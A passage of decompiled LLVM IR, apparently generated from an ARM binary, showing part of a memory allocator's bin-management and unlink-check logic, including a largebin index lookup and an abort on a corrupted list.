  store i32 %v3_121d4, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_121cc, 255
  br i1 %tmp206, label %dec_label_pc_12230, label %dec_label_pc_121dc

dec_label_pc_121dc:                               ; preds = %dec_label_pc_121c8
  %v9_121dc = icmp eq i32 %v3_121d4, %v0_12234
  br i1 %v9_121dc, label %dec_label_pc_121e4, label %dec_label_pc_12230

dec_label_pc_121e4:                               ; preds = %dec_label_pc_121dc
  %v0_121e4 = load i32, i32* @sb, align 4
  %v1_121e4 = add i32 %v0_121e4, 48
  %v2_121e4 = inttoptr i32 %v1_121e4 to i32*
  %v3_121e4 = load i32, i32* %v2_121e4, align 4
  store i32 %v3_121e4, i32* %r3.global-to-local, align 4
  %v9_121e8 = icmp eq i32 %v3_12314, %v3_121e4
  br i1 %v9_121e8, label %dec_label_pc_121f0, label %dec_label_pc_12230

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121e4
  %v1_121f0 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_121d0, %v1_121f0
  br i1 %tmp207, label %dec_label_pc_121f8, label %dec_label_pc_12230

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121f0
  %v2_121f8 = sub i32 %v1_121d0, %v0_121cc
  store i32 %v2_121f8, i32* %r2.global-to-local, align 4
  %v2_121fc = add i32 %v0_121cc, %v3_12314
  store i32 %v2_121fc, i32* %r3.global-to-local, align 4
  %v1_12200 = or i32 %v0_121cc, 1
  store i32 %v1_12200, i32* %r0.global-to-local, align 4
  %v1_12204 = or i32 %v2_121f8, 1
  store i32 %v1_12204, i32* %r1.global-to-local, align 4
  %v1_12208 = add i32 %v3_12314, 8
  store i32 %v1_12208, i32* %r4.global-to-local, align 4
  %v2_1220c = add i32 %v0_12234, 8
  %v3_1220c = inttoptr i32 %v2_1220c to i32*
  store i32 %v2_121fc, i32* %v3_1220c, align 4
  %v0_12210 = load i32, i32* %r3.global-to-local, align 4
  %v1_12210 = load i32, i32* %ip.global-to-local, align 4
  %v2_12210 = add i32 %v1_12210, 12
  %v3_12210 = inttoptr i32 %v2_12210 to i32*
  store i32 %v0_12210, i32* %v3_12210, align 4
  %v0_12214 = load i32, i32* %r0.global-to-local, align 4
  %v1_12214 = load i32, i32* @r6, align 4
  %v2_12214 = add i32 %v1_12214, 4
  %v3_12214 = inttoptr i32 %v2_12214 to i32*
  store i32 %v0_12214, i32* %v3_12214, align 4
  %v0_12218 = load i32, i32* %r3.global-to-local, align 4
  %v1_12218 = load i32, i32* @sb, align 4
  %v2_12218 = add i32 %v1_12218, 48
  %v3_12218 = inttoptr i32 %v2_12218 to i32*
  store i32 %v0_12218, i32* %v3_12218, align 4
  %v0_1221c = load i32, i32* %r2.global-to-local, align 4
  %v1_1221c = load i32, i32* %r3.global-to-local, align 4
  %v3_1221c = add i32 %v1_1221c, %v0_1221c
  %v4_1221c = inttoptr i32 %v3_1221c to i32*
  store i32 %v0_1221c, i32* %v4_1221c, align 4
  %v0_12220 = load i32, i32* %r1.global-to-local, align 4
  %v1_12220 = load i32, i32* %r3.global-to-local, align 4
  %v2_12220 = add i32 %v1_12220, 4
  %v3_12220 = inttoptr i32 %v2_12220 to i32*
  store i32 %v0_12220, i32* %v3_12220, align 4
  %v0_12224 = load i32, i32* %ip.global-to-local, align 4
  %v1_12224 = load i32, i32* %r3.global-to-local, align 4
  %v2_12224 = add i32 %v1_12224, 12
  %v3_12224 = inttoptr i32 %v2_12224 to i32*
  store i32 %v0_12224, i32* %v3_12224, align 4
  %v0_12228 = load i32, i32* %ip.global-to-local, align 4
  %v1_12228 = load i32, i32* %r3.global-to-local, align 4
  %v2_12228 = add i32 %v1_12228, 8
  %v3_12228 = inttoptr i32 %v2_12228 to i32*
  store i32 %v0_12228, i32* %v3_12228, align 4
  br label %dec_label_pc_12958

dec_label_pc_12230:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_121e4, %dec_label_pc_121dc, %dec_label_pc_121c8
  %v9_12230 = icmp eq i32 %v1_121d0, %v0_121cc
  %v2_12234 = add i32 %v3_121d4, 8
  %v3_12234 = inttoptr i32 %v2_12234 to i32*
  store i32 %v0_12234, i32* %v3_12234, align 4
  %v0_12238 = load i32, i32* %ip.global-to-local, align 4
  %v1_12238 = load i32, i32* %r5.global-to-local, align 4
  %v2_12238 = add i32 %v1_12238, 12
  %v3_12238 = inttoptr i32 %v2_12238 to i32*
  store i32 %v0_12238, i32* %v3_12238, align 4
  br i1 %v9_12230, label %dec_label_pc_12390.loopexit, label %dec_label_pc_1224c

dec_label_pc_1224c:                               ; preds = %dec_label_pc_12230
  %v0_1224c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_1224c, 255
  br i1 %tmp208, label %dec_label_pc_12270, label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %dec_label_pc_1224c
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v1_12258 = load i32, i32* %r8.global-to-local, align 4
  %v2_12258 = add i32 %v1_12258, ptrtoint (i32* @global_var_21d10.338 to i32)
  %v3_12258 = inttoptr i32 %v2_12258 to i32*
  %v4_12258 = load i32, i32* %v3_12258, align 4
  %v3_1225c = udiv i32 %v0_1224c, 8
  store i32 %v3_1225c, i32* %r0.global-to-local, align 4
  %v4_12260 = mul nuw i32 %v3_1225c, 8
  %v5_12260 = add i32 %v4_12258, %v4_12260
  store i32 %v5_12260, i32* %r3.global-to-local, align 4
  %v1_12264 = add i32 %v5_12260, 44
  store i32 %v1_12264, i32* %ip.global-to-local, align 4
  %v1_12268 = add i32 %v5_12260, 52
  %v2_12268 = inttoptr i32 %v1_12268 to i32*
  %v3_12268 = load i32, i32* %v2_12268, align 4
  store i32 %v3_12268, i32* @lr, align 4
  br label %dec_label_pc_122c8

dec_label_pc_12270:                               ; preds = %dec_label_pc_1224c
  store i32 %v0_1224c, i32* %r0.global-to-local, align 4
  %v1_12274 = call i32 @__malloc_largebin_index(i32 %v0_1224c)
  store i32 %v1_12274, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v1_1227c = load i32, i32* %r8.global-to-local, align 4
  %v2_1227c = add i32 %v1_1227c, ptrtoint (i32* @global_var_21d10.338 to i32)
  %v3_1227c = inttoptr i32 %v2_1227c to i32*
  %v4_1227c = load i32, i32* %v3_1227c, align 4
  %v4_12280 = mul i32 %v1_12274, 8
  %v5_12280 = add i32 %v4_1227c, %v4_12280
  store i32 %v5_12280, i32* %r3.global-to-local, align 4
  %v1_12284 = add i32 %v5_12280, 44
  store i32 %v1_12284, i32* %ip.global-to-local, align 4
  %v1_12288 = add i32 %v5_12280, 52
  %v2_12288 = inttoptr i32 %v1_12288 to i32*
  %v3_12288 = load i32, i32* %v2_12288, align 4
  store i32 %v3_12288, i32* @lr, align 4
  %v9_1228c = icmp eq i32 %v3_12288, %v1_12284
  br i1 %v9_1228c, label %dec_label_pc_122c8, label %dec_label_pc_12294

dec_label_pc_12294:                               ; preds = %dec_label_pc_12270
  %v1_12294 = add i32 %v5_12280, 56
  %v2_12294 = inttoptr i32 %v1_12294 to i32*
  %v3_12294 = load i32, i32* %v2_12294, align 4
  store i32 %v3_12294, i32* %r1.global-to-local, align 4
  %v1_12298 = add i32 %v3_12294, 4
  %v2_12298 = inttoptr i32 %v1_12298 to i32*
  %v3_12298 = load i32, i32* %v2_12298, align 4
  store i32 %v3_12298, i32* %r3.global-to-local, align 4
  %v0_1229c = load i32, i32* %r4.global-to-local, align 4
  %v3_1229c = icmp ult i32 %v0_1229c, %v3_12298
  br i1 %v3_1229c, label %.thread, label %dec_label_pc_122b8.preheader

.thread:                                          ; preds = %dec_label_pc_12294
  store i32 %v1_12284, i32* @lr, align 4
  store i32 %v3_12294, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_122c8

dec_label_pc_122b8.preheader:                     ; preds = %dec_label_pc_12294
  %v2_122a4 = or i32 %v0_1229c, 1
  store i32 %v2_122a4, i32* %r2.global-to-local, align 4
  %v1_122b8182 = add i32 %v3_12288, 4
  %v2_122b8183 = inttoptr i32 %v1_122b8182 to i32*
  %v3_122b8184 = load i32, i32* %v2_122b8183, align 4
  store i32 %v3_122b8184, i32* %r3.global-to-local, align 4
  %v3_122bc186 = icmp ult i32 %v2_122a4, %v3_122b8184
  br i1 %v3_122bc186, label %dec_label_pc_122b4, label %dec_label_pc_122c4

dec_label_pc_122b4:                               ; preds = %dec_label_pc_122b8.preheader, %dec_label_pc_122b4
  %v0_122c4187 = phi i32 [ %v3_122b4, %dec_label_pc_122b4 ], [ %v3_12288, %dec_label_pc_122b8.preheader ]
  %v1_122b4 = add i32 %v0_122c4187, 8
  %v2_122b4 = inttoptr i32 %v1_122b4 to i32*
  %v3_122b4 = load i32, i32* %v2_122b4, align 4
  store i32 %v3_122b4, i32* @lr, align 4
  %v1_122b8 = add i32 %v3_122b4, 4
  %v2_122b8 = inttoptr i32 %v1_122b8 to i32*
  %v3_122b8 = load i32, i32* %v2_122b8, align 4
  store i32 %v3_122b8, i32* %r3.global-to-local, align 4
  %v3_122bc = icmp ult i32 %v2_122a4, %v3_122b8
  br i1 %v3_122bc, label %dec_label_pc_122b4, label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %dec_label_pc_122b4, %dec_label_pc_122b8.preheader
  %v0_122c4.lcssa = phi i32 [ %v3_12288, %dec_label_pc_122b8.preheader ], [ %v3_122b4, %dec_label_pc_122b4 ]
  %v1_122c4 = add i32 %v0_122c4.lcssa, 12
  %v2_122c4 = inttoptr i32 %v1_122c4 to i32*
  %v3_122c4 = load i32, i32* %v2_122c4, align 4
  store i32 %v3_122c4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_122c8

dec_label_pc_122c8:                               ; preds = %.thread, %dec_label_pc_12270, %dec_label_pc_12254, %dec_label_pc_122c4
  %v0_122e8 = phi i32 [ %v1_12284, %dec_label_pc_12270 ], [ %v1_12264, %dec_label_pc_12254 ], [ %v3_122c4, %dec_label_pc_122c4 ], [ %v3_12294, %.thread ]
  %v0_122dc = phi i32 [ %v1_12274, %dec_label_pc_12270 ], [ %v3_1225c, %dec_label_pc_12254 ], [ %v1_12274, %dec_label_pc_122c4 ], [ %v1_12274, %.thread ]
  %v1_122cc = phi i32 [ %v1_1227c, %dec_label_pc_12270 ], [ %v1_12258, %dec_label_pc_12254 ], [ %v1_1227c, %dec_label_pc_122c4 ], [ %v1_1227c, %.thread ]
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v2_122cc = add i32 %v1_122cc, ptrtoint (i32* @global_var_21d10.338 to i32)
  %v3_122cc = inttoptr i32 %v2_122cc to i32*
  %v4_122cc = load i32, i32* %v3_122cc, align 4
  %v3_122d0 = sdiv i32 %v0_122dc, 32
  store i32 %v3_122d0, i32* %r3.global-to-local, align 4
  %v4_122d4 = mul nsw i32 %v3_122d0, 4
  %v5_122d4 = add i32 %v4_122cc, %v4_122d4
  store i32 %v5_122d4, i32* %r1.global-to-local, align 4
  %v1_122d8 = add i32 %v5_122d4, 820
  %v2_122d8 = inttoptr i32 %v1_122d8 to i32*
  %v3_122d8 = load i32, i32* %v2_122d8, align 4
  %v1_122dc = urem i32 %v0_122dc, 32
  store i32 %v1_122dc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_122e4 = shl i32 1, %v1_122dc
  %v8_122e4 = or i32 %v3_122d8, %v7_122e4
  store i32 %v8_122e4, i32* %r3.global-to-local, align 4
  %v1_122e8 = load i32, i32* @r6, align 4
  %v2_122e8 = add i32 %v1_122e8, 12
  %v3_122e8 = inttoptr i32 %v2_122e8 to i32*
  store i32 %v0_122e8, i32* %v3_122e8, align 4
  %v0_122ec = load i32, i32* @lr, align 4
  %v1_122ec = load i32, i32* @r6, align 4
  %v2_122ec = add i32 %v1_122ec, 8
  %v3_122ec = inttoptr i32 %v2_122ec to i32*
  store i32 %v0_122ec, i32* %v3_122ec, align 4
  %v0_122f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_122f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_122f0 = add i32 %v1_122f0, 820
  %v3_122f0 = inttoptr i32 %v2_122f0 to i32*
  store i32 %v0_122f0, i32* %v3_122f0, align 4
  %v0_122f4 = load i32, i32* @r6, align 4
  %v1_122f4 = load i32, i32* @lr, align 4
  %v2_122f4 = add i32 %v1_122f4, 12
  %v3_122f4 = inttoptr i32 %v2_122f4 to i32*
  store i32 %v0_122f4, i32* %v3_122f4, align 4
  %v0_122f8 = load i32, i32* @r6, align 4
  %v1_122f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_122f8 = add i32 %v1_122f8, 8
  %v3_122f8 = inttoptr i32 %v2_122f8 to i32*
  store i32 %v0_122f8, i32* %v3_122f8, align 4
  %v0_12314.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12314

dec_label_pc_12300:                               ; preds = %dec_label_pc_121a0, %dec_label_pc_12158, %dec_label_pc_121b4
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_12308 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12308, i32* @sb, align 4
  %v0_1230c = load i32, i32* @sl, align 4
  %v1_1230c = add i32 %v0_1230c, 16
  store i32 %v1_1230c, i32* @fp, align 4
  %v1_12310 = add i32 %v4_12308, 52
  store i32 %v1_12310, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %dec_label_pc_122c8, %dec_label_pc_12300
  %v0_12234 = phi i32 [ %v0_12314.pre, %dec_label_pc_122c8 ], [ %v1_12310, %dec_label_pc_12300 ]
  %v1_12314 = add i32 %v0_12234, 12
  %v2_12314 = inttoptr i32 %v1_12314 to i32*
  %v3_12314 = load i32, i32* %v2_12314, align 4
  store i32 %v3_12314, i32* @r6, align 4
  %v9_12318 = icmp eq i32 %v3_12314, %v0_12234
  br i1 %v9_12318, label %dec_label_pc_12320, label %dec_label_pc_121c8

dec_label_pc_12320:                               ; preds = %dec_label_pc_12314
  %v0_12320 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_12320, 256
  %v0_123d8.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_12320.dec_label_pc_123d8_crit_edge, label %dec_label_pc_12328

dec_label_pc_12320.dec_label_pc_123d8_crit_edge:  ; preds = %dec_label_pc_12320
  %.pre203 = mul i32 %v0_123d8.pre, 8
  br label %dec_label_pc_123d8

dec_label_pc_12328:                               ; preds = %dec_label_pc_12320
  %v4_12328 = mul i32 %v0_123d8.pre, 8
  %v5_12328 = add i32 %v4_12328, %v0_12234
  store i32 %v5_12328, i32* %r3.global-to-local, align 4
  %v1_1232c = add i32 %v5_12328, -8
  store i32 %v1_1232c, i32* %r1.global-to-local, align 4
  %v1_12330 = add i32 %v5_12328, 4
  %v2_12330 = inttoptr i32 %v1_12330 to i32*
  %storemerge.pre = load i32, i32* %v2_12330, align 4
  br label %dec_label_pc_123d0

dec_label_pc_12338:                               ; preds = %dec_label_pc_123d0
  %v1_12338 = add i32 %v1_12360, 4
  %v2_12338 = inttoptr i32 %v1_12338 to i32*
  %v3_12338 = load i32, i32* %v2_12338, align 4
  store i32 %v3_12338, i32* %r3.global-to-local, align 4
  %v1_1233c = and i32 %v3_12338, -4
  store i32 %v1_1233c, i32* %r2.global-to-local, align 4
  %v3_12340 = icmp ult i32 %v1_1233c, %v0_12320
  %v1_12344 = add i32 %v1_12360, 12
  %v2_12344 = inttoptr i32 %v1_12344 to i32*
  %v3_12344 = load i32, i32* %v2_12344, align 4
  store i32 %v3_12344, i32* %r0.global-to-local, align 4
  br i1 %v3_12340, label %dec_label_pc_123d0, label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_12338
  %v1_1234c = add i32 %v1_12360, 8
  %v2_1234c = inttoptr i32 %v1_1234c to i32*
  %v3_1234c = load i32, i32* %v2_1234c, align 4
  store i32 %v3_1234c, i32* %r1.global-to-local, align 4
  %v1_12350 = add i32 %v3_1234c, 12
  %v2_12350 = inttoptr i32 %v1_12350 to i32*
  %v3_12350 = load i32, i32* %v2_12350, align 4
  store i32 %v3_12350, i32* %r3.global-to-local, align 4
  %v9_12354 = icmp eq i32 %v3_12350, %v1_12360
  br i1 %v9_12354, label %dec_label_pc_1235c, label %dec_label_pc_12368

dec_label_pc_1235c:                               ; preds = %dec_label_pc_1234c
  %v1_1235c = add i32 %v3_12344, 8
  %v2_1235c = inttoptr i32 %v1_1235c to i32*
  %v3_1235c = load i32, i32* %v2_1235c, align 4
  store i32 %v3_1235c, i32* %r3.global-to-local, align 4
  %v9_12360 = icmp eq i32 %v3_1235c, %v1_12360
  br i1 %v9_12360, label %dec_label_pc_1236c, label %dec_label_pc_12368

dec_label_pc_12368:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_1235c
  %v0_12368 = call i32 @abort()
  store i32 %v0_12368, i32* %r0.global-to-local, align 4
  %v0_1236c.pre = load i32, i32* @sl, align 4
  %v1_1236c.pre = load i32, i32* @r2, align 4
  %v0_12374.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1236c

dec_label_pc_1236c:                               ; preds = %dec_label_pc_1235c, %dec_label_pc_12368
  %v1_12374 = phi i32 [ %v3_12344, %dec_label_pc_1235c ], [ %v0_12368, %dec_label_pc_12368 ]
  %v0_12374 = phi i32 [ %v3_1234c, %dec_label_pc_1235c ], [ %v0_12374.pre, %dec_label_pc_12368 ]
  %v1_1236c = phi i32 [ %v1_1233c, %dec_label_pc_1235c ], [ %v1_1236c.pre, %dec_label_pc_12368 ]
  %v0_1236c = phi i32 [ %v0_12320, %dec_label_pc_1235c ], [ %v0_1236c.pre, %dec_label_pc_12368 ]
  %v2_1236c = sub i32 %v1_1236c, %v0_1236c
  store i32 %v2_1236c, i32* %lr.global-to-local, align 4
  %v2_12374 = add i32 %v1_12374, 8
  %v3_12374 = inttoptr i32 %v2_12374 to i32*
  store i32 %v0_12374, i32* %v3_12374, align 4
  %v0_12378 = load i32, i32* %r0.global-to-local, align 4
  %v1_12378 = load i32, i32* %r1.global-to-local, align 4
  %v2_12378 = add i32 %v1_12378, 12
  %v3_12378 = inttoptr i32 %v2_12378 to i32*
  store i32 %v0_12378, i32* %v3_12378, align 4
  %v0_1237c = load i32, i32* %ip.global-to-local, align 4
  %v1_1237c = add i32 %v0_1237c, 8
  store i32 %v1_1237c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_1236c, 15
  br i1 %tmp210, label %dec_label_pc_1239c, label %dec_label_pc_12384

dec_label_pc_12384:                               ; preds = %dec_label_pc_1236c
  %v1_12384 = load i32, i32* %r2.global-to-local, align 4
  %v2_12384 = add i32 %v1_12384, %v0_1237c
  store i32 %v2_12384, i32* %r2.global-to-local, align 4
  %v1_12388 = add i32 %v2_12384, 4
  %v2_12388 = inttoptr i32 %v1_12388 to i32*
  %v3_12388 = load i32, i32* %v2_12388, align 4
  store i32 %v3_12388, i32* %r3.global-to-local, align 4
  store i32 %v1_1237c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12390

dec_label_pc_12390.loopexit:                      ; preds = %dec_label_pc_12230
  %v1_1223c = load i32, i32* @r6, align 4
  %v2_1223c = load i32, i32* @sl, align 4
  %v3_1223c = add i32 %v2_1223c, %v1_1223c
  store i32 %v3_1223c, i32* %r2.global-to-local, align 4
  %v2_12240 = add i32 %v3_1223c, 4
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  %v4_12240 = load i32, i32* %v3_12240, align 4
  store i32 %v4_12240, i32* %r3.global-to-local, align 4
  %v2_12244 = add i32 %v1_1223c, 8
  store i32 %v2_12244, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %.dec_label_pc_12390_crit_edge, %dec_label_pc_12390.loopexit, %dec_label_pc_12384
  %v1_12394 = phi i32 [ %v4_124b8, %.dec_label_pc_12390_crit_edge ], [ %v3_1223c, %dec_label_pc_12390.loopexit ], [ %v2_12384, %dec_label_pc_12384 ]
  %v0_12390 = phi i32 [ %v7_124b8, %.dec_label_pc_12390_crit_edge ], [ %v4_12240, %dec_label_pc_12390.loopexit ], [ %v3_12388, %dec_label_pc_12384 ]
  %v1_12390 = or i32 %v0_12390, 1
  store i32 %v1_12390, i32* %r3.global-to-local, align 4
  %v2_12394 = add i32 %v1_12394, 4
  %v3_12394 = inttoptr i32 %v2_12394 to i32*
  store i32 %v1_12390, i32* %v3_12394, align 4
  br label %dec_label_pc_12958

dec_label_pc_1239c:                               ; preds = %dec_label_pc_1236c
  %v1_1239c = load i32, i32* @sl, align 4
  %v2_1239c = add i32 %v1_1239c, %v0_1237c
  store i32 %v2_1239c, i32* %r2.global-to-local, align 4
  %v1_123a0 = or i32 %v1_1239c, 1
  store i32 %v1_123a0, i32* %r3.global-to-local, align 4
  %v0_123a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_123a4 = or i32 %v0_123a4, 1
  store i32 %v1_123a4, i32* %r1.global-to-local, align 4
  store i32 %v1_1237c, i32* %r4.global-to-local, align 4
  %v2_123ac = add i32 %v0_1237c, 4
  %v3_123ac = inttoptr i32 %v2_123ac to i32*
  store i32 %v1_123a0, i32* %v3_123ac, align 4
  %v0_123b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_123b0 = load i32, i32* @r6, align 4
  %v2_123b0 = add i32 %v1_123b0, 8
  %v3_123b0 = inttoptr i32 %v2_123b0 to i32*
  store i32 %v0_123b0, i32* %v3_123b0, align 4
  %v0_123b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_123b4 = load i32, i32* @r6, align 4
  %v2_123b4 = add i32 %v1_123b4, 12
  %v3_123b4 = inttoptr i32 %v2_123b4 to i32*
  store i32 %v0_123b4, i32* %v3_123b4, align 4
  %v0_123b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_123b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_123b8 = add i32 %v1_123b8, %v0_123b8
  %v4_123b8 = inttoptr i32 %v3_123b8 to i32*
  store i32 %v0_123b8, i32* %v4_123b8, align 4
  %v0_123bc = load i32, i32* %r1.global-to-local, align 4
  %v1_123bc = load i32, i32* %r2.global-to-local, align 4
  %v2_123bc = add i32 %v1_123bc, 4
  %v3_123bc = inttoptr i32 %v2_123bc to i32*
  store i32 %v0_123bc, i32* %v3_123bc, align 4
  %v0_123c0 = load i32, i32* @r6, align 4
  %v1_123c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_123c0 = add i32 %v1_123c0, 12
  %v3_123c0 = inttoptr i32 %v2_123c0 to i32*
  store i32 %v0_123c0, i32* %v3_123c0, align 4
  %v0_123c4 = load i32, i32* @r6, align 4
  %v1_123c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_123c4 = add i32 %v1_123c4, 8
  %v3_123c4 = inttoptr i32 %v2_123c4 to i32*
  store i32 %v0_123c4, i32* %v3_123c4, align 4
  br label %dec_label_pc_12958

dec_label_pc_123d0:                               ; preds = %dec_label_pc_12338, %dec_label_pc_12328
  %v1_12360 = phi i32 [ %storemerge.pre, %dec_label_pc_12328 ], [ %v3_12344, %dec_label_pc_12338 ]
  store i32 %v1_12360, i32* %ip.global-to-local, align 4
  %v9_123d0 = icmp eq i32 %v1_12360, %v1_1232c
  br i1 %v9_123d0, label %dec_label_pc_123d8.loopexit, label %dec_label_pc_12338

dec_label_pc_123d8.loopexit:                      ; preds = %dec_label_pc_123d0
  br label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %dec_label_pc_12320.dec_label_pc_123d8_crit_edge, %dec_label_pc_123d8.loopexit
  %v4_12408.pre-phi = phi i32 [ %.pre203, %dec_label_pc_12320.dec_label_pc_123d8_crit_edge ], [ %v4_12328, %dec_label_pc_123d8.loopexit ]
  %v1_123d8 = add i32 %v0_123d8.pre, 1
  store i32 %v1_123d8, i32* %r2.global-to-local, align 4
  %v1_123dc = urem i32 %v1_123d8, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r0.global-to-local, align 4
  %v6_123e8 = shl i32 1, %v1_123dc
  store i32 %v6_123e8, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_123f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_123f0, i32* %r3.global-to-local, align 4
  %v3_123f4 = udiv i32 %v1_123d8, 32
  store i32 %v3_123f4, i32* @r5, align 4
  %v4_123f8 = mul nuw nsw i32 %v3_123f4, 4
  %v5_123f8 = add i32 %v4_123f0, %v4_123f8
  store i32 %v5_123f8, i32* %r2.global-to-local, align 4
  %v1_123fc = add i32 %v5_123f8, 820
  %v2_123fc = inttoptr i32 %v1_123fc to i32*
  %v3_123fc = load i32, i32* %v2_123fc, align 4
  store i32 %v3_123fc, i32* @r4, align 4
  %v1_12400 = add i32 %v4_123f0, 52
  store i32 %v1_12400, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_12408 = add i32 %v1_12400, %v4_12408.pre-phi
  store i32 %v5_12408, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1240c

dec_label_pc_1240c:                               ; preds = %dec_label_pc_12474, %dec_label_pc_123d8
  %v1_12414 = phi i32 [ %v1_12414.pre, %dec_label_pc_12474 ], [ %v3_123fc, %dec_label_pc_123d8 ]
  %v0_12414 = phi i32 [ %v0_1240c.pre, %dec_label_pc_12474 ], [ %v6_123e8, %dec_label_pc_123d8 ]
  %v1_1240c = sub i32 1, %v0_12414
  %v2_1240c = icmp ult i32 %v0_12414, 2
  %v1_1240c. = select i1 %v2_1240c, i32 %v1_1240c, i32 0
  store i32 %v1_1240c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_12414, %v1_12414
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1240c
  %v5_12418 = or i32 %v1_1240c., 1
  store i32 %v5_12418, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12424.preheader

bb145:                                            ; preds = %dec_label_pc_1240c
  %v2_1241c = icmp eq i32 %v1_1240c., 0
  br i1 %v2_1241c, label %.dec_label_pc_12460.preheader_crit_edge, label %dec_label_pc_12424.preheader

.dec_label_pc_12460.preheader_crit_edge:          ; preds = %bb145
  %v0_1245857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12460.preheader

dec_label_pc_12424.preheader:                     ; preds = %bb145, %.thread15
  %v0_12424.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12424

dec_label_pc_12424:                               ; preds = %dec_label_pc_12424.preheader, %dec_label_pc_12430
  %v0_12424 = phi i32 [ %v0_12424.pre, %dec_label_pc_12424.preheader ], [ %v1_12424, %dec_label_pc_12430 ]
  %v1_12424 = add i32 %v0_12424, 1
  store i32 %v1_12424, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_12424, 2
  br i1 %tmp211, label %dec_label_pc_12504.loopexit, label %dec_label_pc_12430

dec_label_pc_12430:                               ; preds = %dec_label_pc_12424
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r3.global-to-local, align 4
  %v1_12434 = load i32, i32* @r8, align 4
  %v2_12434 = add i32 %v1_12434, ptrtoint (i32* @global_var_21d10.338 to i32)
  %v3_12434 = inttoptr i32 %v2_12434 to i32*
  %v4_12434 = load i32, i32* %v3_12434, align 4
  store i32 %v4_12434, i32* %r2.global-to-local, align 4
  %v4_12438 = mul i32 %v1_12424, 4
  %v5_12438 = add i32 %v4_12434, %v4_12438
  store i32 %v5_12438, i32* %r3.global-to-local, align 4
  %v1_1243c = add i32 %v5_12438, 820
  %v2_1243c = inttoptr i32 %v1_1243c to i32*
  %v3_1243c = load i32, i32* %v2_1243c, align 4
  store i32 %v3_1243c, i32* @r4, align 4
  %v2_12440 = icmp eq i32 %v3_1243c, 0
  br i1 %v2_12440, label %dec_label_pc_12424, label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %dec_label_pc_12430
  %v4_12448 = mul i32 %v1_12424, 256
  %v5_12448 = add i32 %v4_12434, %v4_12448
  store i32 %v5_12448, i32* %r3.global-to-local, align 4
  %v1_1244c = add i32 %v5_12448, 44
  store i32 %v1_1244c, i32* %r0.global-to-local, align 4
  %v0_12450 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12450, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12460.preheader

dec_label_pc_12460.preheader:                     ; preds = %.dec_label_pc_12460.preheader_crit_edge, %dec_label_pc_12448
  %v0_1245857 = phi i32 [ %v1_1244c, %dec_label_pc_12448 ], [ %v0_1245857.pre, %.dec_label_pc_12460.preheader_crit_edge ]
  %v0_1247c = phi i32 [ %v3_1243c, %dec_label_pc_12448 ], [ %v1_12414, %.dec_label_pc_12460.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12450, %dec_label_pc_12448 ], [ %v0_12414, %.dec_label_pc_12460.preheader_crit_edge ]
  %v2_1246054 = and i32 %ip.promoted, %v0_1247c
  %v4_1246056 = icmp eq i32 %v2_1246054, 0
  br i1 %v4_1246056, label %dec_label_pc_12458, label %dec_label_pc_12468

